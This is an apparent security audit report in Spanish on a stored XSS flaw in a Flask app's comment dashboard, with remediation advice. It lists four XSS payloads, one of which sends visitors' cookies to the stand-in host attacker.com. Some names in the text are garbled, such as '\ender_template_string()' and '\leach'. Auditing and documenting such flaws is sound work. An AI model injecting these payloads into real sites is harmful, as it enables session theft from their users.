# Explotación 2: Stored Cross-Site Scripting (XSS)

**Auditor:** DAVID H. CUEVAS SALGADO 
**Fecha:** 29/11/2025 17:45  
**Vulnerabilidad:** Stored XSS  
**Severidad:** ALTA (CVSS 7.5)

---

## Descripción del Exploit

Se logró inyectar código JavaScript malicioso en los comentarios de la aplicación. 
El código se almacena en la base de datos y se ejecuta cada vez que cualquier usuario visualiza el dashboard.

## Payloads Utilizados

### Payload 1: Alert básico
\\\html
<script>alert('XSS Vulnerability by David Cuevas')</script>
\\\

### Payload 2: Robo de cookies
\\\html
<script>document.location='http://attacker.com?cookie='+document.cookie</script>
\\\

### Payload 3: Event handler
\\\html
<img src=x onerror='alert("XSS")'>
\\\

### Payload 4: SVG vector
\\\html
<svg/onload=alert('XSS')>
\\\

## Pasos de Explotación

1. Autenticarse en la aplicación
2. Navegar al dashboard
3. Enviar comentario con payload XSS
4. El script se almacena en la base de datos
5. Cualquier usuario que visualice el dashboard ejecuta el código

## Evidencia

- Script automatizado: \security-audit/exploits/02_stored_xss.py\
- 4 payloads diferentes probados exitosamente
- Código JavaScript ejecutándose en navegador
- Payload visible en HTML sin escape

## Impacto Demostrado

- **Robo de sesiones:** Cookie stealing mediante document.cookie
- **Phishing:** Inyección de formularios falsos
- **Keylogging:** Captura de teclas del usuario
- **Redirección:** Envío a sitios maliciosos
- **Defacement:** Modificación del contenido de la página

## Código Vulnerable

\\\python
# En dashboard()
{% for comment in comments %}
    <li class="list-group-item">{{ comment['comment'] }}</li>
{% endfor %}
\\\

El uso de \ender_template_string()\ desactiva el auto-escaping de Jinja2.

## Recomendaciones

1. Usar archivos template separados (auto-escape activado)
2. Sanitizar input con \escape()\ o \leach\
3. Implementar Content Security Policy (CSP)
4. Validación whitelist de caracteres permitidos

---

**Status:** EXPLOTACIÓN EXITOSA

